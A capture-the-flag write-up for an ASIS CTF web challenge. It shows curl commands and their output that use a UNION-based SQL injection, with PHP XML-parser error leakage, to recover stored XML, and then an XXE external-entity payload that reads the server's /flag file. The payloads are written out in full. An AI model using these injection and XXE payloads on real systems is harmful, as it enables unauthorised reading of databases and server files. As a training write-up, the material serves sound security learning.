# Treasury 1 and 2

```
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl 'https://poems.asisctf.com/books.php?type=excerpt&id=%27%20UNION%20select%20CONCAT(REPLACE((select%20info%20from%20books%20where%20id=1),%20%22\n%22,%20%22%22),%20%22%3C%22);--%20--'<br />
<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : Extra content at the end of the document in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): n: Mazda Publishers.http://www.thesongsofhafiz.com/kashani1.htm&lt;/excerpt&gt;&lt;/book&gt; in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string():                                                                                ^ in <b>/code/books.php</b> on line <b>54</b><br />
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl 'https://poems.asisctf.com/books.php?type=excerpt&id=%27%20UNION%20select%20CONCAT(REPLACE(REPLACE((select%20info%20from%20books%20where%20id=1),%20%22\n%22,%20%22%22),%20%22n:%20Mazda%20Publishers.http://www.thesongsofhafiz.com/kashani1.htm%3C/excerpt%3E%3C/book%3E%22,%22%22),%20%22%3C%22);--%20--'  
<br />
<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : StartTag: invalid element name in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): :Kashani, A. A.  (1984).  Odes of Hafiz: Poetical horoscope. (pp. 182) Lexingto&lt; in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string():                                                                                ^ in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : Premature end of data in tag excerpt line 1 in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): :Kashani, A. A.  (1984).  Odes of Hafiz: Poetical horoscope. (pp. 182) Lexingto&lt; in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string():                                                                                ^ in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : Premature end of data in tag book line 1 in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): :Kashani, A. A.  (1984).  Odes of Hafiz: Poetical horoscope. (pp. 182) Lexingto&lt; in <b>/code/books.php</b> on line <b>54</b><br />
<br />
<b>Warning</b>:  simplexml_load_string():
```

We can keep replacing the part in the error message in order to get more of the full value and get the full value and we find the xml format which is

```xml
<?xml version=\"1.0\" encoding=\"UTF-8\"?><book><id></id><name></name><author></author><year></year><link></link><flag></flag><excerpt>
```

Now that we know how the XML is formatted, let's insert the entire value into the `<excerpt></excerpt>`, replacing the characters that make it valid XML.

```
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl 'https://poems.asisctf.com/books.php?type=excerpt&id=%27%20UNION%20select%20CONCAT(%22%3C?xml%20version=\%221.0\%22%20encoding=\%22UTF-8\%22?%3E%3Cbook%3E%3Cid%3E%3C/id%3E%3Cname%3E%3C/name%3E%3Cauthor%3E%3C/author%3E%3Cyear%3E%3C/year%3E%3Clink%3E%3C/link%3E%3Cflag%3E%3C/flag%3E%3Cexcerpt%3E%22,%20REPLACE((Select%20info%20from%20books%20where%20id=1),%20%22%3C%22,%22%22),%20%22%3C/excerpt%3E%3C/book%3E%22);--%20--'
?xml version="1.0" encoding="UTF-8"?>
book>
  id>1/id>
  name>Dīvān of Hafez/name>
  author>Khwāja Shams-ud-Dīn Muḥammad Ḥāfeẓ-e Shīrāzī/author>
  year>1315-1390/year>
  link>https://ganjoor.net/hafez/ghazal/sh255//link>
  flag>Your flag is not here! Read more books :)/flag>
  excerpt>Joseph will come back to Canaan again, 
...
/book>%
```

So let's try the next book, id 2.

```
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl 'https://poems.asisctf.com/books.php?type=excerpt&id=%27%20UNION%20select%20CONCAT(%22%3C?xml%20version=\%221.0\%22%20encoding=\%22UTF-8\%22?%3E%3Cbook%3E%3Cid%3E%3C/id%3E%3Cname%3E%3C/name%3E%3Cauthor%3E%3C/author%3E%3Cyear%3E%3C/year%3E%3Clink%3E%3C/link%3E%3Cflag%3E%3C/flag%3E%3Cexcerpt%3E%22,%20REPLACE((Select%20info%20from%20books%20where%20id=2),%20%22%3C%22,%22%22),%20%22%3C/excerpt%3E%3C/book%3E%22);--%20--'
?xml version="1.0" encoding="UTF-8"?>
book>
  id>2/id>
  name>Gulistan of Saadi/name>
  author>Abū-Muhammad Muslih al-Dīn bin Abdallāh Shīrāzī, the Saadi/author>
  year>1258/year>
  link>https://ganjoor.net/saadi/golestan/gbab1/sh36//link>
  flag>OK! You can use ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884} flag, but I keep the `/flag` file secure :-//flag>
  excerpt>...excerpt>
/book>%   
```

Well, we got one flag, let's take a look at 3 to see if there's anymore information.

```
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl 'https://poems.asisctf.com/books.php?type=excerpt&id=%27%20UNION%20select%20CONCAT(%22%3C?xml%20version=\%221.0\%22%20encoding=\%22UTF-8\%22?%3E%3Cbook%3E%3Cid%3E%3C/id%3E%3Cname%3E%3C/name%3E%3Cauthor%3E%3C/author%3E%3Cyear%3E%3C/year%3E%3Clink%3E%3C/link%3E%3Cflag%3E%3C/flag%3E%3Cexcerpt%3E%22,%20REPLACE((Select%20info%20from%20books%20where%20id=3),%20%22%3C%22,%22%22),%20%22%3C/excerpt%3E%3C/book%3E%22);--%20--'
?xml version="1.0" encoding="UTF-8"?>
book>
  id>3/id>
  name>Shahnameh of Ferdowsi/name>
  author>Abul-Qâsem Ferdowsi Tusi/author>
  year>977-1010/year>
  link>https://ganjoor.net/ferdousi/shahname/jamshid/sh1//link>
  flag>Just if I could read files :(/flag>
  excerpt>...excerpt>
/book>% 
```

Let's setup our payload given we know the xml format and the location of the flag file:

```xml
<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag'>]><book><id></id><name></name><author></author><year></year><link></link><flag></flag><excerpt>&test;</excerpt></book>
```

Now we just need a query that returns it, and to execute the request:

```
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl 'https://poems.asisctf.com/books.php?type=excerpt&id=%27%20UNION%20SELECT%20%22%3C%3Fxml%20version%3D%5C%221%2E0%5C%22%20encoding%3D%5C%22UTF%2D8%5C%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20test%20SYSTEM%20%27file%3A%2F%2F%2Fflag%27%3E%5D%3E%3Cbook%3E%3Cid%3E%3C%2Fid%3E%3Cname%3E%3C%2Fname%3E%3Cauthor%3E%3C%2Fauthor%3E%3Cyear%3E%3C%2Fyear%3E%3Clink%3E%3C%2Flink%3E%3Cflag%3E%3C%2Fflag%3E%3Cexcerpt%3E%26test%3B%3C%2Fexcerpt%3E%3C%2Fbook%3E%22%3B%2D%2D%20%2D%2D'
ASIS{03482b1821398ccb5214d891aed35dc87d3a77b2}
```